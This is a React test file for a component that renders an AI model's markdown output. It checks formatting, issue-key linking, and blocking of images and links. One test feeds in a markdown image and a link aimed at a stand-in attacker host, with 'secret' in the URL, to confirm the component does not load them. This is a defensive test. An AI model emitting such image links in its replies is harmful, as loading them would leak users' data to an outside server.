import { screen, within } from '@testing-library/react';
import { describe, expect, it } from 'vitest';

import { renderAtRoute } from '../../test/router';
import { AssistantMarkdown } from './AssistantMarkdown';

function renderMarkdown(source: string) {
  const result = renderAtRoute(() => <AssistantMarkdown source={source} />, { path: '/' });
  return result;
}

describe('AssistantMarkdown', () => {
  it('renders markdown structure', async () => {
    const { container } = renderMarkdown(
      'Two items need you:\n\n- **CP-1042** is waiting\n- `code` stays code',
    );
    await screen.findByText(/Two items need you/);
    expect(container.querySelector('ul')).not.toBeNull();
    expect(container.querySelector('strong')).not.toBeNull();
    expect(screen.getByText('code').tagName).toBe('CODE');
  });

  it('links CP keys to the review screen, inside emphasis too, but not inside code', async () => {
    renderMarkdown('See CP-1042 and **CP-7**, not `CP-99`.');
    expect(await screen.findByRole('link', { name: 'CP-1042' })).toHaveAttribute('href', '/items/1042');
    expect(screen.getByRole('link', { name: 'CP-7' })).toHaveAttribute('href', '/items/7');
    expect(screen.queryByRole('link', { name: 'CP-99' })).toBeNull();
  });

  it('never loads images and shows links as text with their address (no click-through exfiltration)', async () => {
    const { container } = renderMarkdown(
      '![chart](https://evil.example/x.png?d=secret) and [the doc](https://evil.example/?q=1)',
    );
    await screen.findByText(/chart/);
    expect(container.querySelector('img')).toBeNull();
    expect(within(container).queryAllByRole('link')).toEqual([]);
    expect(container.textContent).toContain('the doc (https://evil.example/?q=1)');
  });
});
